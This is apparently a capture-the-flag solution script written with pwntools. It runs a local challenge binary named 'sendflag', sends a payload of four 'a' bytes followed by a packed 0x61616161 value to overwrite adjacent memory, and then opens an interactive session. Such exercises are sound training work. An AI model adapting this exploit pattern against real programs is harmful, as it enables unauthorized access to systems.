from pwn import *

context.log_level = 'debug'

p = process("./sendflag")

if __name__=='__main__':
	payload = 'a'*4 + p32(0x61616161)
	p.recvuntil("BUT YOU SHOULD SEND ME SOME 'a'")
#	gdb.attach(p)	
	p.send(payload)

	p.interactive()
